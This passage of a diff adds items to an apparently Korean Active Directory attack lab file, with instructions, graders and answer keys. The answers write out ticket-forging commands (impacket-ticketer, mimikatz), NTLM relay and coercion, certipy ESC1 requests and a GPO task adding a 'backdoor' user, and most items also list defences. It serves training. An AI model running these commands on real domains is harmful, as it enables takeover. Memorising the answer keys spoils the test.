+  answer: echo -e '=== Golden Ticket Attack ===\n\n[Prerequisites]\n- krbtgt NTLM hash (from DCSync)\n- Domain SID\n- Domain name\n\n[Creation - Impacket]\nimpacket-ticketer -nthash KRBTGT_HASH -domain-sid
+    S-1-5-21-XXX -domain lab.local Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec lab.local/Administrator@dc -k -no-pass\n\n[Creation - Mimikatz]\nkerberos::golden /user:Administrator
+    /domain:lab.local /sid:S-1-5-21-XXX /krbtgt:HASH /ticket:golden.kirbi\n\n[Capabilities]\n- Impersonate ANY user (including non-existent)\n- Valid for 10 years by default\n- Survives password resets
+    (except krbtgt 2x reset)\n\n[Detection]\n- TGT with abnormal lifetime\n- PAC validation failures\n- Event 4769 from non-DC sources'
+  answer_detail: Golden Ticket은 krbtgt 해시로 위조한 TGT로, 도메인의 모든 사용자를 사칭할 수 있다. 10년의 유효기간이 설정되며, 일반 비밀번호 변경으로는 무효화할 수 없다. krbtgt 비밀번호를 2회 변경해야 이전 Golden Ticket이 무효화된다. 이는 도메인 완전 장악의 최종 단계이다.
+  verify:
+    type: output_contains
+    expect: Golden Ticket
+    field: stdout
+  target_vm: attacker
+- order: 7
+  instruction: Silver Ticket 공격을 분석하고, Golden Ticket과의 차이점을 비교하라.
+  hint: 서비스 계정의 NTLM 해시로 특정 서비스 티켓만 위조한다
+  category: exploit
+  points: 10
+  answer: 'echo -e ''=== Silver Ticket vs Golden Ticket ===\n\n[Silver Ticket]\n- Forges Service Ticket (TGS)\n- Requires: Service account NTLM hash\n- Scope: Single service only\n- Does NOT contact KDC\n-
+    Harder to detect (no TGT request)\n\n[Creation]\nimpacket-ticketer -nthash SVC_HASH -domain-sid S-1-5-21-XXX -domain lab.local -spn MSSQLSvc/db.lab.local Administrator\n\n[Golden Ticket]\n- Forges TGT\n-
+    Requires: krbtgt NTLM hash\n- Scope: Entire domain\n- Contacts KDC for TGS\n- Event 4769 generated\n\n[Comparison]\nAttribute     | Golden          | Silver\nHash needed   | krbtgt          | Service
+    account\nScope         | Full domain     | Single service\nKDC contact   | Yes (for TGS)   | No\nDetection     | Easier          | Harder\nPAC validation| By KDC          | By service (often skipped)'''
+  answer_detail: Silver Ticket은 서비스 계정의 NTLM 해시로 특정 서비스의 티켓만 위조한다. KDC를 거치지 않으므로 TGT 관련 이벤트가 발생하지 않아 탐지가 더 어렵다. 하지만 범위가 단일 서비스로 제한된다. 대부분의 서비스가 PAC(Privilege Attribute Certificate) 검증을 수행하지 않아 위조 티켓이 그대로
+    수용된다.
+  verify:
+    type: output_contains
+    expect: Silver Ticket
+    field: stdout
+  target_vm: attacker
+- order: 8
+  instruction: ACL(Access Control List) 남용을 통한 권한 상승을 분석하라. GenericAll, GenericWrite, WriteDacl 등 위험한 ACE를 설명하라.
+  hint: BloodHound에서 발견되는 위험한 AD 권한 관계를 문서화한다
+  category: exploit
+  points: 10
+  answer: 'echo -e ''=== AD ACL Abuse ===\n\n[Dangerous ACEs]\n\nGenericAll (Full Control)\n- On User: Reset password, modify group membership\n- On Group: Add members (add self to Domain Admins)\n- On
+    Computer: Resource-based constrained delegation\n\nGenericWrite\n- On User: Modify attributes (SPN for Kerberoasting)\n- On Computer: Modify msDS-AllowedToActOnBehalfOfOtherIdentity\n\nWriteDacl\n-
+    Modify ACL of target object\n- Grant self GenericAll, then escalate\n\nForceChangePassword\n- Reset target user password without knowing current\n\nWriteOwner\n- Take ownership of object, then modify
+    DACL\n\n[Attack Chain Example]\nUser(WriteDacl) -> Grant GenericAll -> Reset DA password -> Domain Admin'''
+  answer_detail: AD ACL 남용은 BloodHound가 특히 잘 탐지하는 공격 벡터이다. 일반 사용자에게 부여된 과도한 권한(GenericAll, WriteDacl 등)을 통해 도메인 관리자로 권한 상승할 수 있다. 이러한 권한은 위임(delegation)이나 실수로 부여되는 경우가 많다. 정기적인 ACL 감사가 필수적이다.
+  verify:
+    type: output_contains
+    expect: AD ACL Abuse
+    field: stdout
+  target_vm: attacker
+- order: 9
+  instruction: Unconstrained Delegation 공격을 분석하라. 위임이 설정된 시스템에서 TGT를 탈취하는 과정을 설명하라.
+  hint: 비제한 위임이 설정된 컴퓨터에 접근하면 해당 시스템에 인증한 모든 사용자의 TGT를 메모리에서 추출할 수 있다
+  category: exploit
+  points: 10
+  answer: 'echo -e ''=== Unconstrained Delegation Attack ===\n\n[Concept]\n- System trusted for delegation stores user TGTs\n- Any user authenticating to this system leaves their TGT in memory\n\n[Discovery]\nGet-DomainComputer
+    -Unconstrained (PowerView)\nldapsearch: (userAccountControl:1.2.840.113556.1.4.803:=524288)\n\n[Attack]\n1. Compromise unconstrained delegation host\n2. Coerce authentication from DC (PrinterBug/PetitPotam)\n3.
+    Capture DC TGT from memory (Rubeus/mimikatz)\n4. Use DC TGT for DCSync\n\n[Coercion Methods]\n- PrinterBug (MS-RPRN): SpoolSample.exe DC ATTACKER\n- PetitPotam (MS-EFSRPC): PetitPotam.py ATTACKER DC\n\n[Defense]\n-
+    Minimize unconstrained delegation\n- Use constrained delegation instead\n- Protected Users group (no delegation)'''
+  answer_detail: 비제한 위임(Unconstrained Delegation)이 설정된 시스템은 인증한 사용자의 TGT를 메모리에 저장한다. PrinterBug이나 PetitPotam으로 도메인 컨트롤러가 이 시스템에 인증하도록 강제하면, DC의 TGT를 탈취하여 DCSync를 수행할 수 있다. 이는 도메인 관리자 권한 없이도 도메인을 장악하는 강력한
+    기법이다.
+  verify:
+    type: output_contains
+    expect: Unconstrained Delegation
+    field: stdout
+  target_vm: attacker
+- order: 10
+  instruction: NTLM Relay 공격을 분석하라. Responder와 ntlmrelayx를 사용한 자격증명 릴레이 과정을 설명하라.
+  hint: Responder로 NTLM 인증을 가로채고, ntlmrelayx로 다른 시스템에 릴레이한다
+  category: exploit
+  points: 10
+  answer: 'echo -e ''=== NTLM Relay Attack ===\n\n[Step 1: Poisoning with Responder]\nresponder -I eth0 -rdwv\n- Poisons LLMNR/NBT-NS/mDNS queries\n- Captures NTLMv2 hashes\n\n[Step 2: Relay with ntlmrelayx]\nimpacket-ntlmrelayx
+    -tf targets.txt -smb2support\n\n[Relay Targets]\n- SMB -> Remote code execution (if SMB signing disabled)\n- LDAP -> Modify AD objects (add computer, change ACL)\n- HTTP -> Access web applications\n\n[Advanced:
+    RBCD Attack via LDAP Relay]\nntlmrelayx --delegate-access -t ldap://DC\n-> Creates computer account\n-> Sets RBCD on target\n-> S4U2Self/S4U2Proxy for impersonation\n\n[Defense]\n- Enable SMB signing
+    on ALL systems\n- Enable LDAP signing and channel binding\n- Disable LLMNR and NBT-NS\n- EPA (Extended Protection for Authentication)'''
+  answer_detail: NTLM Relay는 가로챈 NTLM 인증을 다른 서비스에 중계하는 공격이다. SMB 서명이 비활성화된 시스템에 릴레이하면 원격 코드 실행이, LDAP에 릴레이하면 AD 객체 수정이 가능하다. Resource-Based Constrained Delegation(RBCD) 공격과 결합하면 도메인 관리자 권한까지 획득할 수 있다.
+  verify:
+    type: output_contains
+    expect: NTLM Relay
+    field: stdout
+  target_vm: attacker
+- order: 11
+  instruction: 그룹 정책(GPO) 남용을 분석하라. GPO 수정 권한을 통한 도메인 전체 코드 실행 방법을 설명하라.
+  hint: GPO에 대한 쓰기 권한이 있으면 도메인 전체에 명령을 실행할 수 있다
+  category: exploit
+  points: 10
+  answer: 'echo -e ''=== GPO Abuse ===\n\n[Concept]\n- Group Policy Objects define settings for users/computers\n- Modifying a GPO affects all linked OUs\n\n[Attack Prerequisites]\n- GPC write access (GenericAll/GenericWrite
+    on GPO)\n- GPO linked to target OU\n\n[Exploitation Methods]\n1. Scheduled Task: Add immediate task that runs as SYSTEM\n   SharpGPOAbuse --AddComputerTask --TaskName "Backdoor" --Author admin --Command
+    "cmd.exe" --Arguments "/c net user backdoor P@ss /add"\n\n2. Computer Startup Script:\n   Place script in GPO SYSVOL path\n\n3. Registry modification:\n   Add Run key for persistence\n\n[Tools]\n- SharpGPOAbuse\n-
+    pyGPOAbuse\n- PowerView: Get-DomainGPO\n\n[Detection]\n- Event 5136: Directory Service Changes\n- Monitor SYSVOL modifications\n- GPO version number changes'''
+  answer_detail: GPO 남용은 도메인 전체에 영향을 미칠 수 있는 강력한 공격이다. GPO에 대한 수정 권한이 있으면 스케줄 작업, 시작 스크립트, 레지스트리 키를 추가하여 연결된 OU의 모든 컴퓨터에서 SYSTEM 권한으로 코드를 실행할 수 있다. SYSVOL 디렉토리와 GPO 버전 변경을 모니터링해야 한다.
+  verify:
+    type: output_contains
+    expect: GPO Abuse
+    field: stdout
+  target_vm: attacker
+- order: 12
+  instruction: 도메인 신뢰(Trust) 관계를 분석하고, 신뢰를 통한 교차 도메인 공격을 설명하라.
+  hint: 도메인 간 신뢰 관계를 악용하여 다른 도메인의 리소스에 접근한다
+  category: exploit
+  points: 10
+  answer: 'echo -e ''=== Domain Trust Attacks ===\n\n[Trust Types]\n- Parent-Child: Bidirectional, transitive (Forest internal)\n- Forest: Can be one-way or bidirectional\n- External: Non-transitive\n\n[Enumeration]\nnltest
+    /domain_trusts (Windows)\nGet-DomainTrust (PowerView)\n\n[Cross-Domain Attacks]\n\n1. SID History Injection\n- Add Enterprise Admin SID to Golden Ticket\n- Works across parent-child trusts\n- Blocked
+    by SID filtering in forest trusts\n\n2. Trust Key Abuse\n- DCSync trust account hash\n- Create inter-realm TGT\n- Access resources in trusted domain\n\n3. Foreign Group Membership\n- Users from Domain
+    A in Domain B groups\n- Enumerate with BloodHound cross-domain\n\n[Defense]\n- SID filtering on external trusts\n- Selective authentication\n- Minimize cross-domain privileged access'''
+  answer_detail: 도메인 신뢰 관계는 AD 포리스트 내외부의 리소스 공유를 위해 설정된다. Golden Ticket에 Enterprise Admin SID를 포함하면 부모-자식 신뢰를 통해 전체 포리스트를 장악할 수 있다. SID 필터링은 포리스트 간 신뢰에서 이를 차단하지만, 내부 신뢰에서는 기본적으로 비활성화되어 있다.
+  verify:
+    type: output_contains
+    expect: Domain Trust
+    field: stdout
+  target_vm: attacker
+- order: 13
+  instruction: AD Certificate Services(ADCS) 공격을 분석하라. ESC1~ESC8 취약점 중 주요 공격 벡터를 설명하라.
+  hint: Certify나 Certipy 도구를 사용한 인증서 남용 공격을 문서화한다
+  category: exploit
+  points: 10
+  answer: echo -e '=== AD Certificate Services (ADCS) Attacks ===\n\n[ESC1] Misconfigured Certificate Template\n- Template allows SAN (Subject Alternative Name)\n- Low-privilege user can request cert as
+    anyone\n- certipy req -ca CA -template VulnTemplate -upn admin@lab.local\n\n[ESC4] Template Access Control\n- User has write access to certificate template\n- Modify template to enable ESC1 conditions\n\n[ESC6]
+    EDITF_ATTRIBUTESUBJECTALTNAME2\n- CA flag allows SAN in any request\n- Any template becomes ESC1-like\n\n[ESC8] NTLM Relay to HTTP Enrollment\n- Relay NTLM auth to CA web enrollment\n- Request certificate
+    as relayed user\n\n[Tool]\ncertipy find -u user@lab.local -p pass -dc-ip 10.20.30.1\ncertipy req -ca LAB-CA -template User -upn admin@lab.local\ncertipy auth -pfx admin.pfx\n\n[Defense]\n- Audit all
+    certificate templates\n- Remove unnecessary enrollment permissions\n- Disable SAN in templates\n- Require CA certificate manager approval'
+  answer_detail: ADCS는 2021년 SpecterOps의 연구('Certified Pre-Owned')로 주목받은 공격 표면이다. 인증서 템플릿 오설정(ESC1)이 가장 흔하며, SAN 지정이 허용된 템플릿으로 도메인 관리자 인증서를 요청하면 Kerberos PKINIT으로 인증할 수 있다. Certipy 도구로 자동 탐지 및 공격이 가능하다.
+  verify:
+    type: output_contains
+    expect: ADCS
+    field: stdout
+  target_vm: attacker
+- order: 14
+  instruction: AD 공격 후 도메인 지속성(Persistence) 기법을 분석하라. Golden Ticket 외의 지속성 기법을 정리하라.
+  hint: AdminSDHolder, DCShadow, Skeleton Key, Directory Service Restore Mode 등을 다룬다
+  category: exploit
+  points: 15
+  answer: 'echo -e ''=== AD Persistence Techniques ===\n\n[1] AdminSDHolder\n- Protected objects synced every 60 min by SDProp\n- Add ACE to AdminSDHolder -> propagates to all protected groups\n- Survives
+    manual ACL cleanup\n\n[2] DCShadow\n- Register rogue DC in AD\n- Push malicious changes via replication\n- Changes appear legitimate (from DC)\n\n[3] Skeleton Key\n- Patch LSASS on DC\n- Universal password
+    (mimikatz) for any account\n- Lost on DC reboot\n\n[4] DSRM Abuse\n- Directory Services Restore Mode password\n- Local admin on DC\n- DsrmAdminLogonBehavior=2 enables network login\n\n[5] Machine Account
+    Quota\n- Default: any user can add 10 computers\n- Rogue computer for RBCD attacks\n\n[6] Certificate Persistence\n- Request long-lived certificate\n- Valid even after password change\n\n[Defense]\n-
+    Monitor AdminSDHolder changes\n- Restrict DC replication\n- Regular krbtgt rotation'''
+  answer_detail: AD 지속성은 권한을 유지하는 다양한 기법을 포함한다. AdminSDHolder 조작은 SDProp 프로세스가 ACL을 복원하므로 방어자가 수동으로 제거해도 60분 후 재적용된다. DCShadow는 가짜 DC를 등록하여 AD 변경을 합법적으로 보이게 만든다. 인증서 기반 지속성은 비밀번호 변경 후에도 유효하다.
+  verify:
+    type: output_contains
+    expect: AD Persistence
+    field: stdout
+  target_vm: attacker
+- order: 15
+  instruction: AD 공격 실습을 종합하여 공격 킬체인과 방어 전략을 /tmp/ad_attack_report.txt에 작성하라.
+  hint: 초기 접근부터 도메인 장악까지의 전체 공격 체인과 각 단계별 방어를 정리한다
+  category: analysis
+  points: 15
+  answer: 'cat > /tmp/ad_attack_report.txt << ''EOF''
+
+    === AD Attack Kill Chain Report ===
+
+
+    [Phase 1: Initial Access]
+
+    Technique: Phishing, web exploit -> domain user shell
+
+    Defense: MFA, email filtering, endpoint protection
+
+
+    [Phase 2: Enumeration]
+
+    Technique: BloodHound, LDAP queries, SPN enum
+
+    Defense: LDAP query monitoring, tiered admin model
+
+
+    [Phase 3: Privilege Escalation]
+
+    Technique: Kerberoasting, ACL abuse, ADCS (ESC1)
+
+    Defense: Strong SPN passwords, ACL audit, template hardening
+
+
+    [Phase 4: Lateral Movement]
+
+    Technique: Pass-the-Hash, NTLM relay, RDP
+
+    Defense: SMB signing, LAPS, network segmentation
+
+
+    [Phase 5: Domain Dominance]
+
+    Technique: DCSync, Golden Ticket, GPO abuse
+
+    Defense: DC replication monitoring, krbtgt rotation, GPO audit
+
+
+    [Phase 6: Persistence]
+
+    Technique: AdminSDHolder, DCShadow, certificates
+
+    Defense: AdminSDHolder monitoring, replication audit
+
+
+    [Overall Strategy]
+
+    - Implement AD tiered administration model
+
+    - Deploy Microsoft Defender for Identity
+
+    - Regular Purple Team exercises
+
+    - Zero Trust with Conditional Access
+
+    EOF
+
+    cat /tmp/ad_attack_report.txt'
+  answer_detail: AD 공격은 체계적인 킬체인을 따르며, 각 단계에서 방어 기회가 존재한다. Microsoft의 Tiered Administration Model(Tier 0/1/2)은 권한 분리를, Defender for Identity는 실시간 위협 탐지를 제공한다. 정기적인 Purple Team 훈련으로 탐지 능력을 지속적으로 향상시켜야 한다.
+  verify:
+    type: output_contains
+    expect: AD Attack Kill Chain
+    field: stdout
+  target_vm: attacker
